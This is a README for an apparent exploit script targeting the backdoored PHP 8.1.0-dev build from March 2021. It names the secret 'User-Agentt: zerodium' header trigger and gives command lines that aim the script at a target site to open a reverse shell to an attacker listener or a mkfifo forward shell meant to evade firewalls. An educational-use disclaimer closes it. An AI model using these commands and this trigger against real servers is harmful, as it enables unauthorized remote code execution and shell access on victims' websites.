# PHP 8.1.0-dev Backdoor Remote Code Execution

PHP verion 8.1.0-dev was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header with secret word zerodium.

The original code was restored after the issue was discovered, but then tampered with a second time. The breach would have created a backdoor in any websites that ran the compromised version of PHP, enabling hackers to perform remote code execution on the site.

This exploit creates a reverse shell or a pseudo interactive shell using mkfifo for firewall evasion

## Getting Started

### Executing program

* For reverse shell 
```
python3 php8.1_dev.py -t http://vulnerablesite/ -lhost 127.0.0.1 -lport 9001
```
* For forward shell firewall evasion
```
python3 php8.1_dev.py -t http://vulnerablesite/ -fs
```

## Help

For Help Menu
```
python3 php8.1_dev.py -h
```

## Acknowledgments

Backstory and Inspiration
* [Zerodium](https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/)

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.